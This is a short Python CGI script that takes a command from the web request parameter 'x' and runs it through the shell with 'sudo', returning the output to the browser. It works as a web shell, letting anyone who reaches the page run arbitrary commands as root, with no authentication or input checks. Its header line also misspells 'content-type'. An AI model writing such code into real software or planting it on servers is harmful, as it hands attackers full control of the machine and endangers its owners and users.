#!/usr/bin/python3

print("context-type: text/html")
print()

import cgi
import subprocess



f = cgi.FieldStorage()
cmd = f.getvalue("x")
output = subprocess.getoutput('sudo '  +  cmd)
print(output)
